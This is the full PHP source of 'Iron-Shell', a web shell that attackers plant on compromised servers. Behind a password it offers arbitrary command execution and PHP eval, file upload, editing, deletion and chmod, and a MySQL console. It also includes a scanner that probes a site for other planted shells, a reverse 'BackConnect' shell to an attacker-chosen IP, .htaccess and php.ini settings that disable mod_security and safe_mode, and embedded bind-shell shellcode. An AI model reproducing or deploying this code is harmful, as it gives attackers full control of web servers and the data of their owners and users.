<?php
//Edited By KinG-InFeT & Aghilas
error_reporting(0);

$password = "21232f297a57a5a743894a0e4a801fc3"; // You can put a md5 string here too, for plaintext passwords: max 31 chars.

$me = basename(__FILE__);
$cookiename = "shell";
if(isset($_POST['pass'])) //If the user made a login attempt, "pass" will be set eh?

{
if(strlen($password) == 32) //If the length of the password is 32 characters, threat it as an md5.
{
$_POST['pass'] = md5($_POST['pass']);
}
if($_POST['pass'] == $password)
{
setcookie($cookiename, $_POST['pass'], time()+3600); //It's alright, let hem in
}
reload();
}
if(!empty($password) && !isset($_COOKIE[$cookiename]) or ($_COOKIE[$cookiename] != $password))
{

login();
die();
}
if(isset($_GET['p']) && $_GET['p'] == "logout")
{
setcookie ($cookiename, "", time() - 3600);
reload();
}
if(isset($_GET['dir']))
{
chdir($_GET['dir']);
}

$pages = array(

'serinfo' => 'Server info',
'creat' => 'Creat File',
'cmd' => 'CMD',
'killz' => 'Security Killer',
'syml' => 'Symlink Server (BYPASS)',
'eval' => 'Evaluate PHP',
'backc' => 'BackConnect',
'mysql' => 'MySQL Interface',
'chmod' => 'Chmod Files',
'finder' => 'Shell Finder',
'zh' => 'Zone-h Sender',
'headers' => '<br>Show headers',
'pfdm' => 'PHP File Damager',
'about' => '<font color=red>About Me </font>',
'logout' => 'Log out'
);



//The header, like it?
$header = '<html>
<title>'.getenv("HTTP_HOST").' ~ Iron-Shell</title><head><style>
td {

font-size: 12px; 
font-family: verdana;
color: white;
background: green;
}

#d {
background: blue;
}
#f {
background: blue;
}
#s {
background: red;
}
#d:hover
{
background: black;
}
#f:hover
{
background: #000000;

}
pre {
font-size: 10px; 
font-family: verdana;
color: white;
}
a:hover {
text-decoration: none;
}
input,textarea,select {
border-top-width: 1px; 
font-weight: bold; 
border-left-width: 1px; 
font-size: 10px; 
border-left-color: lime; 
background: blue; 
border-bottom-width: 1px; 
border-bottom-color: white; 
color: red; 
border-top-color: white; 
font-family: verdana; 
border-right-width: 1px; 
border-right-color: #33FF00;
}
hr {
color: red;
background-color: white;
height: 5px;
}
</style>
</head>
<body bgcolor=green alink="orange" vlink="red" link="lime">
<table width=100%><td id="header" width=100%>
<p align=left><b>/<a href="'.$me.'">Home</a>/ ';

foreach($pages as $page => $page_name)
{
$header .= ' /<a href="?p='.$page.'&dir='.realpath('.').'">'.$page_name.'</a>/ ';
}
$header .= '<br><hr>'.show_dirs('.').'</td><tr><td>';
print $header;
$footer = '<tr><td><hr><br><br><center>Iron Shell > &copy; Aghilas --</a>><a href="http://localhost/">Modification !</a></center></td></table></body></head></html>';
if(isset($_REQUEST['p']))
{
switch ($_REQUEST['p']) {




case 'finder': //shll findr
print'<form action="" method="post">
<p class="frontboxtext">Site => <input name="zbi" class="textbox" type="text" size="30" value=""/>
<input name="go" class="text" value="g0" type="submit"><br><br>do not forgot the ===> http:// + /
</form>';

set_time_limit(0);
if (isset($_POST["zbi"])) {
$targt = $_POST['zbi'];
echo "<br /><b><font color='gray'>Finding Shell On ==></b></font><font color='blue'> ".$targt."</font><br /><br />";

$shlz = array("shell.php", "sh3ll.php", "c4.php", "c9.php", "c99.php", "c104.php", "c100.php", "fuck.php",
 "404.php", "04.php", "dz.php", "sql.php", "sy.php", "sym.php", "SYM.php", "Sym.php",
 "symlink.php", "Symlink.php", "v4.php", "v2.php", "whmcs.php", "kill.php", "bypass.php", "h4x0r.php",
 "ksa.php", "y0.php", "c4.php", "0wned.php", "owned.php", "hacker.php", "mass.php", "wp-mass.php",
 "ss.php", "xx.php", "x.php", "cp.php", "CP.php", "zz.php", "lol.php", "l0l.php",
 "n00b.php", "noob.php", "c99shell.php", "hell.php", "h.php", "mad.php", "madspot.php", "algeria.php",
 "error.php", "err.php", "b0x3d.php", "boom.php", "priv8.php", "pv8.php", "prv8.php", "x0x.php", 
 "2013.php", "new.php", "tr.php", "4.php", "dkks.php", "haha.php", "php.php", "-.php", 
 "owner.php", "psy.php", "xsec.php", "p4c.php", "pca.php", "PK.php", "ani.php", "rab3oun.php", "sec.php", 
 "0day.php", "1337.php", "1337day.php", "injector.php", "inj3ct0r.php", "dam.php", "security.php", 
 "crack.php", "cpcrack.php", "cpanel.php", "pass.php", "passwd.php", "1.txt/", "sym/", "root.php", "toor.php", 
 "xxxx.php", "xxx.php", "try.php", "tryag.php", "CMD.php", "cmd.php", "PRIV8.php", "r00t.php", "egy.php", 
 "team.php", "lool.php", "in.php", "indishell.php", ").php", "webroot/", "/root", "3.php", "pro.php", 
 "ftp.php", "zh.php", "fire.php", "tmp.php", "/configs", "bugs.php", "/shadow", "/hack", "sss.php", 
 "best.php", "ws0.php", "crazy.php", "jak.php", "/priv8", "/config.php", "z3r0.php", "0.php", "R00T.php", 
 "wso.php", "boff.php", "b0ff.php", "xd.php", "xD.php", "wtf.php", "DZ.php", "48.php", "49.php", "x85.php", 
"o.php", "up.php", "upload.php", "uploader.php", "upl.php", "upl0ad.php", "upl0ader.php", "upl0ad3r.php", "myshell.php", 
"owned.php", "joom-mass.php", "mass-deface.php", "gun.php", "nn.php", "nice.php", "google.php", "pwd.php", "passwordshell.php", 
"id.php", "kwkw.php", "wow.php", "dz4.php", "h4ck3r.php", "rooter.php", "c0nfig.php", "itsecteam.php", "itsec.php", 
"indonesia.php", "looser.php", "att.php", "dz4hack.php", "dz4sec.php", "dzsec.php", "dzsecurity.php", "what.php", "dsn.php", "dz0.php", 
"0ver.php", "brut.php", "06.php", "over.php", "db.php", "SQL.php", "cof.php", "extract.php", "byMe.php", 
"Mailer.php", "snbx.php", "cache.php", "cach.php", "123.php", "anonymous.php", "gtfo.php", 
"test.php", "403.php", "err0r.php", "sh311.php", "c.php", "sendb0x.php", "snedbox.php", "mailer.php", "byme.php", "omg.php", "Omg.php", 
"cc.php", "bz.php", "44.php", "silent.php", "st.php", "1995.php", "2000.php", "isco.php", "OMG.php", 
"knight.php", "lamer.php", "hihi.php", "hh.php", "bot.php", "f0x.php", "fx0.php", 
"syrian.php", "v4.php", "0x.php", "xox.php", "0o0.php", "x0x.php", "0000.php", "cnfg.php", "control.php", 
"c02.php", "co2.php", "c0der.php", "coder.php", "code.php", "bt.php");

foreach ($shlz as $kwkw){
$headers = get_headers("$targt$kwkw");
if (eregi('200', $headers[0])) {
  echo "<a href='$targt$kwkw'><b>$targt$kwkw</a><b><font color='lightgreen'> Success - Shell Founded</font></b><br />";
}
else {
  echo "</b>$targt$kwkw <font color='red'><b>N0t Found !</b></font><br />";
}
}
}
break;


case 'cmd': //Run command
print "<form action=\"".$me."?p=cmd&dir=".$_GET['dir']."\" method=POST><b>Command : </b><input type=text name=command>&nbsp;<input type=submit value=\"Execute\"></form>";
if(isset($_REQUEST['command']))
{
print "<pre><h3><br><br>------- <font color=red>Result </font>-------</h3><br><br>";

execute_command(get_execution_method(),$_REQUEST['command']); //You want fries with that?

}
break;


case 'zh': //zh sender
print "<h2>Soon =)";
break;

case 'edit': //Edit a fie
if(isset($_POST['editform']))
{
$f = $_GET['file'];
$fh = fopen($f, 'w') or print "Error while opening file!";
fwrite($fh, $_POST['editform']) or print "Couldn't save file!";
fclose($fh);
}
print "<font color=gray>Editing file ===> <font color=orange><b>".$_GET['file']."</b><font color=grayz> (".perm($_GET['file']).")</font><br><br><form action=\"".$me."?p=edit&file=".$_GET['file']."\" method=POST><textarea cols=90 rows=15 name=\"editform\">";
$rd = file($_GET['file']);
foreach($rd as $l)
{
print htmlspecialchars($l);
}
print "</textarea><br><br><input type=submit value=\"Save\"></form>";
break;


case 'creat': //crt file
echo"<h3>Creat File : </h3>";

$kwkwkw = htmlspecialchars(@$_POST['names']);
$wkwkwk = @$_POST['source'];
if(isset($kwkwkw) && isset($wkwkwk))
{
$ctd = fopen($kwkwkw,"w+"); 
fwrite($ctd, $wkwkwk);
fclose($ctd);
echo "<script>alert('$kwkwkw ---> Success')</script>"; 
}
  
echo "<html><font size='2' face='Verdana'><b>";
echo "<p aligne=left><b><form method='post' action=''>
<font size='1'>Name:</font><br>
<input type='text' name='names' size='30' value=dz.php><br><br>
<font size='1'>Source:</font><br>

<textarea rows='10' cols='30' name='source' ></textarea><br><br>
<input type='submit' value='Make'>
";
break;

case 'pfdm': //damager
echo"<h3>PHP FILE DAMAGER SoooooN ! </h3>";

break;

case 'delete': //Delete a file
if(isset($_POST['yes']))
{
if(unlink($_GET['file']))
{
print "<b><font color=black>File deleted successfully.";
}
else
{
print "<b><font color=red>Couldn't delete file.</font>";
}
}
if(isset($_GET['file']) && file_exists($_GET['file']) && !isset($_POST['yes']))
{
print "<b>Confirmation !!  <br><br>
<form action=\"".$me."?p=delete&file=".$_GET['file']."\" method=POST>
<input type=hidden name=yes value=yes>
<input type=submit value=\"Delete\">
";
}
break;

case 'about': //aghilas
print"<b><pre>
              Author : <font color=orange>Aghilas</font>
              From   : <font color=gray>Algeria</font>

            <font color=lightblue>  Iron Shell Modification </font>
              
--------Added/Removed/Changed------- Functions !

Server Info : <font color=pink>Added</font>
Creat File    : <font color=pink>Added</font>
Sec Killer    :<font color=pink> Added</font>
Triks           : <font color=pink>Added</font>
Symlink      : <font color=pink>Added</font>
Shell Finder: <font color=pink>Added</font>
Z-h Sender : <font color=pink>Added</font>
Damager    :<font color=pink>Added</font>

CSS             : <font color=blue>Changed</font> 


BackConnect : BackConnect Shell Version <font color=red>'REMOVED'</font> + Add New BackConnect (PHP).
MD5 Brute     : <font color=red>'Removed'</font>

-----------------------------------------------------------------------------------------------------
<font color=black>Greet'z To : 
<font color=grayz>

         Evil-Dz / Elite_TrOjan / Erreur404 / Hidden Pain / DzPhoenix / HaCker-Fire
         xDjamil / Yacine Jocker / Original_Dz / MAD.MAN / Br!scO-Dz / Vaga HaCker Dz
         Gel-Dz  / LaCr!z_Dz / .....<font color=lightgreen> & ALL MY FRIENDS :)
<font color=white>
-----------------------------------------------------------------------------------------------------</Font></pre>

";
break;


case 'eval': //Evaluate PHP code
print "<form action=\"".$me."?p=eval\" method=POST>
<textarea cols=60 rows=10 name=\"eval\">";
if(isset($_POST['eval']))
{
print htmlspecialchars($_POST['eval']);
}
else
{
print "print \"Aghilas\";";
}
print "</textarea><br>
<br><input type=submit value=\"Eval\">
</form>";
if(isset($_POST['eval']))
{
print "<h1><font color=gray>Result :</font></h1>";
print "<br>";
eval($_POST['eval']);
}
break;



case 'chmod': //Chmod file
print " ";
if(isset($_POST['chmod']))
{
switch ($_POST['chvalue']){
case 777:
chmod($_POST['chmod'],0777);
break;
case 644:
chmod($_POST['chmod'],0644);
break;
case 755:
chmod($_POST['chmod'],0755);
break;
}
print "Changed permissions on ".$_POST['chmod']." to ".$_POST['chvalue'].".";
}
if(isset($_GET['file']))
{
$content = urldecode($_GET['file']);
}
else
{
$content = "file/path/please";
}
print "<form action=\"".$me."?p=chmod&file=".$content."&dir=".realpath('.')."\" method=POST><b>File to chmod:
<input type=text name=chmod value=\"".$content."\" size=70><br><b>New permission:</b>
<select name=\"chvalue\">
<option value=\"777\">777</option>
<option value=\"644\">644</option>
<option value=\"755\">755</option>
</select><input type=submit value=\"Change\">";
break;


case 'mysql': //MySQL Query
if(isset($_POST['host']))
{
$link = mysql_connect($_POST['host'], $_POST['username'], $_POST['mysqlpass']) or die('Could not connect: ' . mysql_error());
mysql_select_db($_POST['dbase']);
$sql = $_POST['query'];
$result = mysql_query($sql);
// Q: why is there a huge block of commented code?
// A: because it's UNFINISHED and not READY for use in the shell!

/*
if(preg_match("/^SELECT (.*) FROM (.*)/i",$sql,$stuff) or preg_match("/^SELECT (.*) FROM (.*) WHERE/i",$sql,$stuff)) //Do we expect data?
{

$fields = array();
$rs = mysql_query("SHOW COLUMNS FROM ".$stuff[2]);
for($i=0;$i<mysql_num_rows($rs);$i++){
array_push($fields,mysql_result($rs, $i));
}
print "SELECT found in query, returning data:<br><table border=0>";
foreach($fields as $field)
{
print "<td><b>".$field."</b></td>";
}
print "</tr>";
$size = count(mysql_fetch_array($result, MYSQL_NUM));
while ($row = mysql_fetch_array($result, MYSQL_NUM)) {
$i = 0;
while($i != $size)
{
print "<td>".$row[$i]."</td>";
$i++;
}
    print "<tr>";
}
print "</table>";
}
else
{
print "There was no data to be returned.";
}
*/
}
else
{
print "
This only queries the database, doesn't return data!<br>
<form action=\"".$me."?p=mysql\" method=POST>
<b>Host:<br></b><input type=text name=host value=\"localhost\" size=10><br>
<b>Username:<br><input type=text name=username value=\"root\" size=10><br>
<b>Password:<br></b><input type=password name=mysqlpass value=\"\" size=10><br>
<b>Database:<br><input type=text name=dbase value=\"test\" size=10><br>
<b>Query:<br></b<textarea name=query></textarea>
<input type=submit value=\"Query database\">
</form>
";
}
break;


case 'serinfo': //info srvr

@set_time_limit(0);
@error_reporting(0);

$phpvs = phpversion();
$uname = php_uname();
$ip = $_SERVER['REMOTE_ADDR'];
$xD = $_SERVER['SERVER_NAME'];
$xx = $_SERVER['SERVER_SOFTWARE'];
$vgayet = $_SERVER['SERVER_PROTOCOL'];
$wtfff = $_SERVER['REQUEST_METHOD'];
$zerosix = $_SERVER['REQUEST_TIME'];
$where = $_SERVER['DOCUMENT_ROOT'];
$adser = $_SERVER['SERVER_ADMIN'];
$date = date('ra');
$portz = $_SERVER['SERVER_PORT']; 
$ownz = $_SERVER['REMOTE_ADDR']; 

$zm = $_SERVER['SCRIPT_NAME']; 
$safe_mode = ini_get("safe_mode");
if (!$safe_mode){$safe_mode = '<font color="grayz"><u>OFF (Not Secure)</u></font>';}
 else {$safe_mode = '<font color="fdc"><u>ON</u></font>';}

echo'<pre><font size=2>';
echo'<font color=gray>Safe_Mode : '.$safe_mode.'<br>';
echo'<font color=gray>Server Protocol : <font color="blue">'.$vgayet.'</font><br>';
echo'<font color=gray>Request Method : <font color="blue">'.$wtfff.'</font><br>';
echo'<font color=gray>Request Time : <font color="blue">'.$zerosix.'</font><br>';

echo'<b>Shell Location ==> <a href='.$zm.'><font color=lightblue>'.$zm.'</a><br></font>';
echo'<br>';

echo'<font color=gray><b>Site Web : <font color="pink"><b><a href='.$xD.'>'.$xD.'</a></font><br>';
echo'<font color=gray>Server IP : <font color="green"><a href="http://www.networktools.nl/reverseip/'.$ip.'">'.$ip.'</a></font><br>';
echo'<font color=gray>HaCker IP : <font color=black>'.$ownz.'</font><br>';
echo'<font color=gray>Where ? : <font color="lightblue">'.$where.'</font><br>';
echo"<font color=gray>id :<font color=yellow> ".@getmyuid()."(".@get_current_user().") - uid=".@getmyuid()." (".@get_current_user().") gid=".@getmygid()."(".@get_current_user().")<br>";

echo'<font color=gray>uname -a : <font color="orange">'.$uname.'</font><br>';
echo'<font color=gray><b>Date/Time : </b><font color=red>'. $date .'</font><br></b>';

echo'<font color=gray>Server PORT : <font color=white>'.$portz.'</font><br>';
echo'<font color=gray>PHP.Version : <font color="grayz">'.''.$xx.'</b></font><br>';

echo'<br><b>Admin Server : <font color=lightgreen>'.$adser.'</font><br>';

echo'<br>';echo'<br>';



break;


case 'backc': //Backconnect shell


echo "</span></span></font></td></tr></table></form></div><center><strong>
<p><font color=gray>------------------------= <font color=red>ConnectBaCk</font><font color=gray> =---------------------
</p></Span></strong></center></body>";

echo "<center><table width='50%' cellPadding=5 cellSpacing=0 borderColorDark=#666666 bordercolorlight='#C0C0C0'>
<tr><td><center>
<form method='POST' action=''> 
<font color='white'>Your IP & Port :<br> 
<input type='text' name='ipim' size='15' value=''>
<input type='text' name='portum' size='5' value='21'><br><br> 
<input type='submit' value='Connect'><br><br>
</form></td></tr>"; 
$ipim=$_POST['ipim']; 
$portum=$_POST['portum']; 
if ($ipim <> "") 
{ 
$mucx=fsockopen($ipim , $portum , $errno, $errstr ); 
if (!$mucx){ 
 $result = "Error: can't connect !!!"; 
} 
else { 

$zamazing0="\n";

fputs ($mucx ,"\n-----Aghilas 0wn`z Your b0x-----\n\n");
fputs($mucx , system("uname -a") .$zamazing0 );
fputs($mucx , system("pwd") .$zamazing0 );
fputs($mucx , system("id") .$zamazing0.$zamazing0 );
while(!feof($mucx)){  
 fputs ($mucx); 
 $one="rOot@Dz";
 $two="~";
 $result= fgets ($mucx, 8192); 
 $message=`$result`; 
 fputs ($mucx, $one. system("x") .$two. " " .$message."\n"); 
 } 
fclose ($mucx); 
} 
} 

break;



case 'rename':
if(isset($_POST['fileold']))
{
if(rename($_POST['fileold'],$_POST['filenew']))
{
print "<font color=lime>File renamed with Success .</font>";
}
else
{
print "<b><font color=red>Couldn't rename file ! </font>";
}
}
if(isset($_GET['file']))
{
$file = basename(htmlspecialchars($_GET['file']));
}
else
{
$file = "";
}
print "Renaming ==> ".$file." in folder ".realpath('.').".<br>
<form action=\"".$me."?p=rename\" method=POST>
<b>Rename:<br></b><input type=text name=fileold value=\"".$file."\" size=70><br>
<b>To:<br><input type=text name=filenew value=\"\" size=10><br>
<input type=submit value=\"Rename file\">
</form>";
break;

case 'killz':

echo"<pre><font color=red>.htaccess  </font>
Options Indexes FollowSymLinks
DirectoryIndex dz.htm
AddType txt .php
AddHandler txt .php
< IfModule mod_autoindex.c>
IndexOptions FancyIndexing IconsAreLinks SuppressHTMLPreamble
< /ifModule>
< IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
< /IfModule>
";


echo'
<font color=red>php.ini  </font>
safe_mode = Off 
disable_functions = NONE 
safe_mode_gid = OFF 
open_basedir = OFF'; 

 
echo'

<font color=red>ini.php </font>
ini_restore("safe_mode"); 
ini_restore("open_basedir");';


break;


case 'headers':
foreach(getallheaders() as $header => $value)
{
print htmlspecialchars($header . ":" . $value)."<br>";
}
break;
}
}

else //Default page that will be shown when the page isn't found or no page is selected.
{
$files = array();
$directories = array();
if(isset($_FILES['uploadedfile']['name']))
{
$target_path = realpath('.').'/';
$target_path = $target_path . basename( $_FILES['uploadedfile']['name']); 
if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
    print "<b><font color=orange>File : <font color=blue>".  basename( $_FILES['uploadedfile']['name']). 
    " </font>has been uploaded <br><br>";
} else{
    echo "<b><font color=red>File upload failed !<br><br></font>";
}
}
print "<table border=0 width=100%><td width=5% id=s><b>Options</b></td><td id=s><b>Filename</b></td><td id=s><b>Size</b></td><td id=s><b>Permissions</b></td><tr>";
if ($handle = opendir('.'))
{
while (false !== ($file = readdir($handle))) 

{
      if(is_dir($file))
  {
$directories[] = $file;
  }
  else
  {
$files[] = $file;
  }
}
asort($directories);
asort($files);
foreach($directories as $file)
{
print "<td id=d><a href=\"?p=rename&file=".realpath($file)."&dir=".realpath('.')."\">[R]</a><a href=\"?p=delete&file=".realpath($file)."\"> [D]</a></td><td id=d><a href=\"".$me."?dir=".realpath($file)."\">".$file."</a></td><td id=d ></td><td id=d><a href=\"?p=chmod&dir=".realpath('.')."&file=".realpath($file)."\">".perm($file)."</a></td><tr>";
}
foreach($files as $file)
{

print "<td id=f><a href=\"?p=rename&file=".realpath($file)."&dir=".realpath('.')."\">[R]</a><a href=\"?p=delete&file=".realpath($file)."\"> [D]</a></td><td id=f><a href=\"".$me."?p=edit&dir=".realpath('.')."&file=".realpath($file)."\">".$file."</a></td><td id=f>".filesize($file)."</td><td id=f><a href=\"?p=chmod&dir=".realpath('.')."&file=".realpath($file)."\">".perm($file)."</a></td><tr>";
}
}
else
{
print "<u>Error!</u> Can't open <b>".realpath('.')."</b>!<br>";

}

print "</table><hr><table border=0 width=100%><td><b>Upload file : <form enctype=\"multipart/form-data\" action=\"".$me."?dir=".realpath('.')."\" method=\"POST\">
<input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"100000000\" /><input name=\"uploadedfile\" type=\"file\" />
<input type=\"submit\" value=\"Upload File\" />
</form></td><td><form action=\"".$me."\" method=GET><b>Directory : <br></b><input type=text size=40 name=dir value=\"".realpath('.')."\"><input type=submit value=\"Change Directory\"></form></td></table>";
}


function login()
{
print "<table border=0 width=100% height=100%><td valign=\"middle\"><center>
<form action=".basename(__FILE__)." method=\"POST\"><title>Shell-Security</title><b><font color=red face=\"courier new\"><body bgcolor=blue>Password :</b>
<input type=\"password\" maxlength=\"32\" name=\"pass\"><input type=\"submit\" value=\"Login\">
</form>";
}

function reload()
{
header("Location: ".basename(__FILE__));
}

function get_execution_method()
{
if(function_exists('passthru')){ $m = "passthru"; }
if(function_exists('exec')){ $m = "exec"; }
if(function_exists('shell_exec')){ $m = "shell_ exec"; }
if(function_exists('system')){ $m = "system"; }
if(!isset($m)) //No method found :-|
{
$m = "Disabled";
}
return($m);
}
function execute_command($method,$command)
{
if($method == "passthru")
{
passthru($command);
}
elseif($method == "exec")
{
exec($command,$result);
foreach($result as $output)
{
print $output."<br>";
}
}
elseif($method == "shell_exec")
{
print shell_exec($command);
}
elseif($method == "system")
{
system($command);
}
}

function perm($file)
{
if(file_exists($file))
{
return substr(sprintf('%o', fileperms($file)), -4);
}
else
{
return "????";
}
}
function spawn_shell()
{
//Powered by php-security
   $shellcode = "\x6a\x66\x58\x6a\x01\x5b\x99\x52\x53\x6a\x02\x89".
                "\xe1\xcd\x80\x52\x43\x68\xff\x02".
                "\x22\xb8". //port (8888)
                "\x89\xe1".
                "\x6a\x10\x51\x50\x89\xe1\x89\xc6\xb0\x66\xcd\x80".
                "\x43\x43\xb0\x66\xcd\x80\x52\x56\x89\xe1\x43\xb0".
                "\x66\xcd\x80\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80".
                "\x41\xe2\xf8\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f".
                "\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";

  $________________________str = str_repeat("A", 39);
  $________________________yyy = &$________________________str;
  $________________________xxx = &$________________________str;
  for ($i = 0; $i < 65534; $i++) $arr[] = &$________________________str;
  $________________________aaa = "   XXXXX   ";
  $________________________aab = " XXXx.xXXX ";
  $________________________aac = " XXXx.xXXX ";
  $________________________aad = "   XXXXX   ";
  unset($________________________xxx);
  unset($________________________aaa);
  unset($________________________aab);
  unset($________________________aac);
  unset($________________________aad);

  $arr = array($shellcode => 1);
  $addr = unpack("L", substr($________________________str, 6*4, 4));
  $addr = $addr[1] + 32;
  $addr = pack("L", $addr);
  for ($i=0; $i<strlen($addr); $i++) {
    $________________________str[8*4+$i] = $addr[$i];
    $________________________yyy[8*4+$i] = $addr[$i];
  }
  unset($arr);
}
function show_dirs($where)
{
if(ereg("^c:",realpath($where)))
{
$dirparts = explode('\\',realpath($where));
}
else
{
$dirparts = explode('/',realpath($where));
}
$i = 0;
$total = "";
foreach($dirparts as $part)
{
$p = 0;
$pre = "";
while($p != $i)
{
$pre .= $dirparts[$p]."/";
$p++;
}
$total .= "<a href=\"".basename(__FILE__)."?dir=".$pre.$part."\">".$part."</a> ";
$i++;
}
return "<h2>".$total."</h2><br>";
}
print $footer;
// Exit: maybe we're included somewhere and we don't want the other code to mess with ours :-)
exit();
?>
